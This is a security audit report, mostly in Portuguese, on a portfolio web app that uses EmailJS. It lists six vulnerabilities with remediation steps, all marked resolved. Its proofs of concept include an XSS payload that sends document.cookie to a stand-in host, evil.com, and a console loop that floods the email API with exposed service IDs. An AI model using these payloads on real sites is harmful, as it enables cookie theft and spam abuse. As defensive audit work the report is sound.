# Security Audit — Portfolio

**Data:** 2026-03-24
**Escopo:** Análise white-hat do app (React 19 + Vite + EmailJS, SPA estático)
**Analista:** Senior White Hat Review

---

## Status Update — 2026-03-24

All vulnerabilities resolved. See implementation branch `feat/security-fixes`.

| ID | Status |
|----|--------|
| VULN-01 | ✅ Resolvido — credenciais movidas para Vercel Serverless Function |
| VULN-02 | ✅ Resolvido — Cloudflare Turnstile integrado |
| VULN-03 | ✅ Resolvido — security headers configurados via vercel.json |
| VULN-04 | ✅ Resolvido — stripHtml aplicado no backend |
| VULN-05 | ✅ Resolvido — e-mail ofuscado via getPersonalEmail() |
| VULN-06 | ✅ N/A — sem scripts de CDN externo |

---

## Sumário Executivo

O projeto é uma SPA estática sem backend próprio. A superfície de ataque é reduzida, porém existem vulnerabilidades relevantes — especialmente pela exposição de credenciais de serviço de terceiros e ausência de proteções básicas no formulário de contato.

---

## Vulnerabilidades Encontradas

---

### VULN-01 — Credenciais EmailJS expostas no bundle JS
**Severidade:** 🔴 Crítica
**Arquivo:** `src/services/email-service.ts`, `.env`

**Descrição:**
As variáveis `VITE_EMAILJS_SERVICE_ID`, `VITE_EMAILJS_TEMPLATE_ID` e `VITE_EMAILJS_PUBLIC_KEY` são prefixadas com `VITE_`, o que faz o Vite embutir seus valores diretamente no bundle JavaScript gerado. Qualquer visitante pode recuperá-las via DevTools → Sources ou inspecionando o arquivo JS minificado.

**Impacto:**
Um atacante pode usar essas credenciais para:
- Enviar e-mails ilimitados usando sua conta EmailJS (spam, phishing)
- Esgotar a cota mensal gratuita do serviço
- Usar seu domínio/remetente para enviar mensagens maliciosas

**Prova de conceito (como testar):**
```bash
# Build o projeto e inspecione o bundle
npm run build
grep -r "service_" dist/assets/*.js   # encontra o SERVICE_ID
grep -r "template_" dist/assets/*.js  # encontra o TEMPLATE_ID
grep -r "LB9U4" dist/assets/*.js      # encontra a PUBLIC_KEY
```
Ou simplesmente: DevTools → Network → recarregar página → buscar "emailjs" nos JS carregados.

**Como implementar a correção:**
Criar um endpoint de backend (ex.: Vercel Serverless Function ou Cloudflare Worker) que receba os dados do formulário e faça a chamada ao EmailJS server-side. As credenciais ficam em variáveis de ambiente do servidor, nunca no bundle.

```
Frontend → POST /api/contact → Serverless Function (credenciais seguras) → EmailJS
```

Exemplo de rota (`/api/contact.ts` no Vercel):
```typescript
// As variáveis SEM prefixo VITE_ ficam apenas no servidor
const SERVICE_ID = process.env.EMAILJS_SERVICE_ID;

export default async function handler(req, res) {
  // valida body, chama EmailJS via fetch server-side, retorna resposta
}
```

---

### VULN-02 — Ausência de Rate Limiting / proteção contra spam
**Severidade:** 🟠 Alta
**Arquivo:** `src/components/sections/contact-section.tsx`, `src/services/email-service.ts`

**Descrição:**
O formulário de contato não possui nenhum mecanismo de limitação de envio. Um script automatizado pode disparar centenas de requisições ao EmailJS por segundo.

**Prova de conceito:**
```javascript
// Executar no console do navegador na página de contato:
for (let i = 0; i < 50; i++) {
  fetch('https://api.emailjs.com/api/v1.0/email/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      service_id: 'service_oeku1k3',   // exposta no bundle
      template_id: 'template_sxcna8r',
      user_id: 'LB9U4mAqW7nyBKz6-...',
      template_params: { name: 'bot', message: 'spam' }
    })
  });
}
```

**Como implementar a correção:**
1. **Client-side (paliativo):** debounce + flag de `isSubmitting` já presente, mas insuficiente
2. **Solução real:** Rate limiting no backend (ex.: 1 req/IP a cada 60s) + CAPTCHA

Integrar `@hcaptcha/react-hcaptcha` ou Cloudflare Turnstile (gratuito, sem friction):
```tsx
import Turnstile from 'react-turnstile';

<Turnstile
  sitekey={import.meta.env.VITE_TURNSTILE_KEY}
  onVerify={(token) => setTurnstileToken(token)}
/>
// Validar token no backend antes de enviar e-mail
```

---

### VULN-03 — Ausência de Security Headers HTTP
**Severidade:** 🟠 Alta
**Arquivo:** `vite.config.ts`, configuração de deploy

**Descrição:**
Nenhum header de segurança é configurado. Isso expõe o app a ataques de clickjacking, MIME sniffing, e injeção via iframes.

**Headers ausentes e seus riscos:**

| Header | Risco sem ele |
|--------|--------------|
| `Content-Security-Policy` | XSS via scripts injetados |
| `X-Frame-Options: DENY` | Clickjacking (app embutido em iframe malicioso) |
| `X-Content-Type-Options: nosniff` | MIME sniffing attacks |
| `Referrer-Policy: strict-origin-when-cross-origin` | Vazamento de URL para terceiros |
| `Permissions-Policy` | Acesso indevido a câmera/microfone/geolocalização |

**Como implementar a correção:**
Se hospedado na Vercel, criar `vercel.json` na raiz:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "camera=(), microphone=(), geolocation=()" },
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; connect-src 'self' https://api.emailjs.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; frame-src https://challenges.cloudflare.com;"
        }
      ]
    }
  ]
}
```

---

### VULN-04 — Falta de sanitização de input (XSS Stored via e-mail)
**Severidade:** 🟡 Média
**Arquivo:** `src/services/email-service.ts`, `src/schemas/contact-schema.ts`

**Descrição:**
O Zod valida tamanho e formato, mas **não sanitiza** o conteúdo. Se o template EmailJS renderizar HTML, um atacante pode injetar tags maliciosas que serão exibidas no seu cliente de e-mail.

**Exemplo de payload:**
```
Nome: <script>alert('xss')</script>
Mensagem: <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

**Como implementar a correção:**
Adicionar sanitização com DOMPurify antes de enviar:
```typescript
import DOMPurify from 'dompurify';

export async function sendContactEmail(data: ContactFormData): Promise<void> {
  await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
    name: DOMPurify.sanitize(data.name),
    title: DOMPurify.sanitize(data.subject),
    message: DOMPurify.sanitize(data.message),
    reply_to: data.email,  // já validado como e-mail pelo Zod
  }, PUBLIC_KEY);
}
```

Ou, mais simples — strip de tags HTML com regex antes de enviar:
```typescript
const strip = (s: string) => s.replace(/<[^>]*>/g, '').trim();
```

---

### VULN-05 — Email pessoal exposto em código-fonte
**Severidade:** 🟡 Média
**Arquivo:** `src/data/portfolio-data.ts`

**Descrição:**
O endereço `guiggff@gmail.com` está hardcoded no código-fonte. Bots de scraping rastreiam repositórios GitHub públicos coletando e-mails para listas de spam.

**Como implementar a correção:**
Usar ofuscação simples ou substituir pelo link `mailto:` gerado dinamicamente apenas no cliente, sem expor o texto literal no HTML/JS inicial. Alternativa: usar uma imagem de texto para exibir o e-mail.

---

### VULN-06 — Ausência de Subresource Integrity (SRI)
**Severidade:** 🟢 Baixa
**Arquivo:** `index.html` (se houver CDN externo)

**Descrição:**
Se scripts ou fontes forem carregados de CDNs externos sem atributo `integrity`, um comprometimento do CDN pode injetar código malicioso.

**Como implementar a correção:**
Para cada script/link externo no `index.html`:
```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-HASH_AQUI"
  crossorigin="anonymous"
></script>
```
Gerar o hash com: `openssl dgst -sha384 -binary lib.js | openssl base64 -A`

---

## Matriz de Riscos

| ID | Vulnerabilidade | Severidade | Facilidade de Exploração | Prioridade |
|----|----------------|-----------|--------------------------|-----------|
| VULN-01 | Credenciais EmailJS no bundle | Crítica | Muito Fácil | 1 |
| VULN-02 | Sem rate limiting / CAPTCHA | Alta | Fácil | 2 |
| VULN-03 | Security Headers ausentes | Alta | Média | 3 |
| VULN-04 | Falta de sanitização XSS | Média | Média | 4 |
| VULN-05 | E-mail pessoal exposto | Média | Fácil | 5 |
| VULN-06 | Ausência de SRI | Baixa | Difícil | 6 |

---

## O que está BEM implementado ✅

- `.env` está no `.gitignore` (credenciais não estão no repositório Git)
- Validação com Zod cobre campos obrigatórios, tamanhos e formato de e-mail
- Uso de `aria-invalid` e `aria-describedby` para acessibilidade de erros
- Flag `isSubmitting` previne double-submit no cliente
- TypeScript previne erros de tipo em tempo de compilação
- Sem SQL injection (sem banco de dados)
- Sem SSRF (sem requisições server-side próprias)

---

## Roadmap de Correção

```
Semana 1 (Crítico):
  [ ] VULN-01: Migrar EmailJS para Vercel Serverless Function
  [ ] VULN-02: Integrar Cloudflare Turnstile (gratuito)

Semana 2 (Alto):
  [ ] VULN-03: Adicionar vercel.json com security headers
  [ ] VULN-04: Adicionar DOMPurify no email-service.ts

Semana 3 (Médio/Baixo):
  [ ] VULN-05: Ofuscar e-mail no portfolio-data.ts
  [ ] VULN-06: Verificar e adicionar SRI em recursos externos
```

---

## Ferramentas Utilizadas na Auditoria

- Análise estática manual do código-fonte
- Inspeção do bundle de produção (`npm run build` + grep)
- [securityheaders.com](https://securityheaders.com) — verificação de headers
- [observatory.mozilla.org](https://observatory.mozilla.org) — score de segurança
- OWASP Top 10 como referência de categorias
